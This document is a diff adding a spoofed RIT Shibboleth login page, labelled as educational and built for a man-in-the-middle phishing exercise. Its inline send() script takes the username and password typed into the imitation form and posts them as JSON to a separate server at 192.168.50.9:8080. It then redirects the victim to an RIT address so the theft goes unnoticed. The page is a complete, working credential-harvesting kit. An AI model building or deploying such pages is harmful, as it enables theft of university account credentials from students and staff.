@@ -1,0 +1,447 @@
+<!-- 
+    Spoofed RIT shiboleth login page
+    WARNING: THIS WAS MADE AND USED FOR
+             EDUCATIONAL PURPOSES ONLY
+
+    Author: Nathan Dallmann 
+
+    Notes:
+    - Removed functionality where login page expires after a certain amount of time, made testing go smoother.
+-->
+<!DOCTYPE html>
+<html lang="en" style="--vh: 6.76px;"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="theme-color" content="#F76902">
+    <meta name="description" content="RIT Login">
+    <title>RIT Login</title>
+    <link rel="shortcut icon" href="https://shibboleth.main.ad.rit.edu/assets-v1/images/favicon.ico" type="image/x-icon">
+
+    <!-- 
+        Style sheet inclueded inline due to complications in pausing the victim's traffic with out MitM server. 
+        Wasn't able to figure out a way to include images in the html, so issues with pulling images from the 
+        webserver still exists. 
+    -->
+    <style>
+        body {
+            margin: 0;
+            font-family: "Helvetica Neue", "Helvetica", "Roboto", "Arial", sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            display:flex;
+            flex-direction: column;
+            min-height: -webkit-fill-available;
+            height: calc((var(--vh, 1vh) * 100) - 40px);
+            flex-grow: 1;
+            flex-basis: 100%;
+        }
+
+        .container {
+            height: calc(100vh - 40px);
+            margin: auto;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: center;
+                -ms-flex-pack: center;
+                    justify-content: center;
+            -webkit-box-align: center;
+                -ms-flex-align: center;
+                    align-items: center;
+            -ms-flex-line-pack: center;
+                align-content: center;
+        }
+        a {
+            color: #c75300;
+            text-decoration: none;
+            font-weight: bold;
+            -webkit-transition: 0.25s ease-out;
+            -o-transition: 0.25s ease-out;
+            transition: 0.25s ease-out;
+        }
+        a:hover {
+            color: #000000;
+            -webkit-transition: 0.25s ease-in;
+            -o-transition: 0.25s ease-in;
+            transition: 0.25s ease-in;
+        }
+        a:active {
+            color: #727578;
+        }
+        .loginBox label {
+            margin-bottom: 3px;
+        }
+        input[type="checkbox"] {
+            cursor: pointer;
+        }
+        input[type="checkbox"]:checked {
+            accent-color: #f36e21;
+        }
+        input:not([type="checkbox"]) {
+            letter-spacing: 0;
+            padding: 10px 15px;
+            border: 1px solid #727568;
+            border-radius: 2px;
+            -webkit-transition: all 0.5s;
+            -o-transition: all 0.5s;
+            transition: all 0.5s;
+            outline: none;
+        }
+
+        input:-ms-input-placeholder:not([type="checkbox"]){
+            padding-left: 15px;
+            display:inline-block;
+        }
+
+        input:not([type="checkbox"]):focus {
+            border-color: #212529;
+            -webkit-transition: all 0.5s;
+            -o-transition: all 0.5s;
+            transition: all 0.5s;
+        }
+
+        .error {
+            position: relative;
+            padding: 0.75rem 1.25rem;
+            margin-bottom: 1rem;
+            border: 1px solid transparent;
+            border-radius: 0.25rem;
+            color: #721c24;
+            background-color: #f8d7da;
+            border-color: #f5c6cb;
+            text-align: center;
+        }
+
+        .ritLogo {
+            width:20%;
+            max-width: 20%;
+            height: 20%;
+            max-height: 90%;
+            margin: 1em auto;
+        }
+
+        .loginBox {
+            overflow: hidden;
+            border-radius: 5px;
+            min-width: 400px;
+            width: 50vmax;
+            max-width: 600px;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+                -ms-flex-direction: column;
+                    flex-direction: column;
+            -webkit-box-shadow: 0 1px 2px 0 rgb(0 0 0 / 12%), 0 2px 8px 0 rgb(0 0 0 / 24%);
+                    box-shadow: 0 1px 8px 0 #000000, 0 2px 8px 0 #000000;
+                    box-shadow: 0 1px 2px 0 rgb(0 0 0 / 12%), 0 2px 8px 0 rgb(0 0 0 / 24%);
+        }
+
+        .originalHeader img {
+            -ms-flex-item-align: center;
+                align-self: center;
+            cursor: pointer;
+        }
+
+        .originalHeader {
+            background: #f76902;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            justify-content: space-evenly;
+            align-items: center;
+            height:40px;
+        }
+
+        .originalHeader img{vertical-align: middle;}
+
+        .originalHeader > a{
+            color: #FFF;
+            font-size: 14pt;
+        }
+
+        .originalHeader > a:hover{
+            color: #000000;
+        }
+
+        .originalHeader > a:active{
+            color: #727578;
+        }
+
+        .originalHeader input{
+            padding: 1px;
+            border-right-style: none;
+            border-radius: 2px 0 0 2px;
+            -webkit-border-radius: 2px 0 0 2px;
+            -moz-border-radius: 2px 0 0 2px;
+            -ms-border-radius: 2px 0 0 2px;
+            -o-border-radius: 2px 0 0 2px;
+        }
+
+        .originalHeader > form > span{
+            display: flex;
+            align-items: center;
+        }
+
+        .originalHeader > form > span > button{
+            height: fit-content;
+            border: 1px solid #727568;
+            border-left-style: none;
+            border-radius: 0 2px 2px 0;
+            -webkit-border-radius: 0 2px 2px 0;
+            -moz-border-radius: 0 2px 2px 0;
+            -ms-border-radius: 0 2px 2px 0;
+            -o-border-radius: 0 2px 2px 0;
+        }
+
+        .searchButton{
+            width: 16px;
+            height: 13px;
+            cursor: pointer;
+            text-indent: -9999px;
+            background: #FFF url('../images/idbar-orange-search-magnify.gif') no-repeat;
+            border: none;
+        }
+
+        .inputLogin, .loginExpired {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+                -ms-flex-direction: column;
+                    flex-direction: column;
+            padding: 0 1em 1em;
+        }
+
+        .passwordInput {
+            margin-top: 1em;
+            display:block;
+        }
+        .loginButtons {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: justify;
+                -ms-flex-pack: justify;
+                    justify-content: space-between;
+            -webkit-box-align: center;
+                -ms-flex-align: center;
+                    align-items: center;
+            margin-top: 2em;
+        }
+        .inputLogin button {
+            background: #f76902;
+            border: 2px solid #f76902;
+            color: white;
+            padding: 10px 20px;
+            -webkit-transition: all ease-out 0.25s;
+            -o-transition: all ease-out 0.25s;
+            transition: all ease-out 0.25s;
+            font-weight: bold;
+            font-size: 14pt;
+        }
+        .temp {
+            background: #f76902;
+            width: 94.78px;
+            height: 46px;
+            margin-top: 46px;
+            border: 2px solid #f76902;
+            color: white;
+            padding: 10px 20px;
+            -webkit-transition: all ease-out 0.25s;
+            -o-transition: all ease-out 0.25s;
+            transition: all ease-out 0.25s;
+            font-weight: bold;
+            font-size: 14pt;
+        }
+        .temp:hover {
+            background: #000000;
+            border: 2px solid black;
+            -webkit-transition: all ease-in 0.25s;
+            -o-transition: all ease-in 0.25s;
+            transition: all ease-in 0.25s;
+            cursor: pointer;
+        }
+        .inputLogin button:hover {
+            background: #000000;
+            border: 2px solid black;
+            -webkit-transition: all ease-in 0.25s;
+            -o-transition: all ease-in 0.25s;
+            transition: all ease-in 0.25s;
+            cursor: pointer;
+        }
+        .inputLogin img {
+            max-height: 300px;
+            height: auto;
+            max-width: 250px;
+            width: auto;
+            margin: auto;
+        }
+
+        .contactInfo {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+                -ms-flex-direction: column;
+                    flex-direction: column;
+            -webkit-box-align: center;
+                -ms-flex-align: center;
+                    align-items: center;
+            margin-top: 1em;
+        }
+        .contactInfo > * {
+            text-align: center;
+        }
+        .changePassword {
+            margin: 3px 0;
+        }
+
+        .authLinks{
+            gap:5px
+        }
+
+        @media screen and (max-width: 800px) {
+            .originalHeader > *:not(:first-child){
+                display: none;
+            }
+            .ritHeader img {
+                margin-left: -10px;
+            }
+            .loginBox {
+                width: 95vw;
+                min-width: auto;
+            }
+            .authLinks{
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: space-around;
+            }
+        }
+
+        /* CSS Loader */
+        .lds-dual-ring {
+            display: inline-block;
+            width: 80px;
+            height: 80px;
+        }
+        .lds-dual-ring:after {
+            content: " ";
+            display: block;
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            border: 6px solid #f76902;
+            border-color: #f76902 transparent #f76902 transparent;
+            -webkit-animation: lds-dual-ring 1.2s linear infinite;
+                    animation: lds-dual-ring 1.2s linear infinite;
+        }
+        @-webkit-keyframes lds-dual-ring {
+            0% {
+                -webkit-transform: rotate(0deg);
+                        transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+                        transform: rotate(360deg);
+            }
+        }
+        @keyframes lds-dual-ring {
+            0% {
+                -webkit-transform: rotate(0deg);
+                        transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+                        transform: rotate(360deg);
+            }
+        }
+
+
+    </style>
+
+
+  </head>
+    <body>
+        <script>
+            // Inline script to take the values gathered from the username and password <input> tags, and send them in json format 
+            // to a backend server via POST request.
+            function send() {
+                // Getting username and password values from the DOM and storing them in javascript variables.
+                var username = document.getElementById("username").value;
+                var password = document.getElementById("password").value;
+
+                // Creating a json javascript variable for transport via json format.
+                const json = {
+                    username: username,
+                    password: password,
+                }
+
+                // Sending a POST request to the backend server.
+                fetch("http://192.168.50.9:8080/user", {
+                    method: "POST",
+                    headers: {
+                        // Content-type of the POST request set to a json format.
+                        "Content-Type": "application/json",
+                    },
+                    // Json variable created earlier truned into a string and put into the body.
+                    body: JSON.stringify(json)
+                });
+
+                // Points the user's browser to the RIT website, the site they originally intended to go to.
+                window.location.href = "http://129.21.1.40";
+
+            }
+        </script>
+        <span class="originalHeader"><a href="https://rit.edu/" target="_blank" rel="noreferrer"><img src="RIT_hor_w.png" width="375px" alt="RIT Logo"></a></span>
+        <div class="container">
+            <div class="loginBox">
+            <img src="RIT_RGB_hor.png" class="ritLogo" alt="RIT Logo">
+            <span class="contactInfo">
+            <p>
+Login to rit.brightspace.com
+            </p>
+            </span>
+
+                <form id="form1">
+    <input type="hidden" name="csrf_token" value="_f4b83dcb83af65fafb08cc4ff903d6332fc8f09a">
+                    <div class="inputLogin">
+                       
+
+                        <label for="ritUsername">Username</label>
+                        <input id="username" name="username" title="RIT Account Username" placeholder="RIT Username" autocorrect="off" autocapitalize="none">
+                        <label for="ritPassword" class="passwordInput">Password</label>
+                        <input type="password" id="password" name="password" title="RIT Account Password" placeholder="Password">
+                        <span class="loginButtons">
+                            <span style="visibility:hidden">
+                                <input name="donotcache" id="rememberMe" type="checkbox">
+                                <label for="rememberMe">This is a public computer</label>
+                            </span>
+                            <!-- Button changed to execute the previously defined javascript function. -->
+                            <button type="reset" name="butthaha" onclick="send()">Login</button>
+                        </span>
+                        <div class="contactInfo">
+                            <div class="authLinks"><a href="https://start.rit.edu/ForgotUsername?source=shib" target="_blank">Forgot Username?</a> | <a href="https://start.rit.edu/ForgotPassword?source=shib" target="_blank">Forgot Password?</a></div>
+                            <a class="changePassword" href="https://start.rit.edu/" target="_blank">Change Password</a>
+                            <div>Need assistance? Please contact the RIT Service Center at</div>
+                            <div><a href="tel:585-475-5000">585-475-5000</a> or visit <a href="https://help.rit.edu/" target="_blank">help.rit.edu</a></div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <script src="RIT%20Login_files/resize.js" async=""></script>
+        <script>
+            
+        </script>
+    
+ 
+</body></html>
